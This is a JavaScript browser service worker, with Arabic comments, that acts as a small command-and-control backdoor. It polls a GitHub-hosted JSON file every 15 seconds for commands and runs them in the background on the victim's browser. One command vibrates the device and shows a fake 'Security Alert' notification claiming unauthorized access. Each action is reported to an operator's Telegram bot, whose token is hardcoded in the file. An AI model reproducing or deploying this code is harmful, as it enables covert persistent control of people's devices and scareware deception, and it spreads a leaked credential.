const TOKEN = '7100594923:AAFun5qLGrK2gZboWZfmGQLYlmjyecG0Zuo';
// رابط ملف الأوامر على مستودعك
const CMD_URL = 'https://raw.githubusercontent.com/mosbahimouataz7/no-ip-/main/server.json';

let chatId = "";
let lastCmdId = "";

self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => e.waitUntil(clients.claim()));

// استقبال البيانات من الصفحة الرئيسية
self.addEventListener('message', e => {
    if (e.data.type === 'INIT') {
        chatId = e.data.id;
        // بدء حلقة الفحص الدائم (C2 Polling)
        setInterval(pollCommands, 15000); 
    }
});

async function pollCommands() {
    if (!chatId) return;

    try {
        // جلب ملف الأوامر مع منع الكاش (Cache) لضمان السرعة
        const res = await fetch(CMD_URL + '?nocache=' + Date.now());
        const cmd = await res.json();

        // تنفيذ الأمر فقط إذا كان ID جديداً
        if (cmd.id !== lastCmdId) {
            lastCmdId = cmd.id;
            executeAction(cmd.action, cmd.text);
        }
    } catch(e) {}
}

function executeAction(act, txt) {
    let report = "";

    if (act === "VIBRATE") {
        // اهتزاز الهاتف
        if ('vibrate' in navigator) navigator.vibrate([500, 200, 500]);
        
        // إظهار إشعار نظام (يعمل حتى والصفحة مغلقة)
        self.registration.showNotification("Security Alert", {
            body: txt || "Unauthorized access detected!",
            icon: "https://cdn-icons-png.flaticon.com/512/564/564619.png",
            vibrate: [500, 100, 500],
            badge: "https://www.google.com/favicon.ico"
        });
        report = "📳 Executed: Background Vibration & Notification";
    } 
    else if (act === "REPORT") {
        report = "📊 Status Check: Background Agent is ALIVE and Watching.";
    }

    // إبلاغك على تليجرام بنجاح العملية
    if (chatId && report) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}`);
    }
}
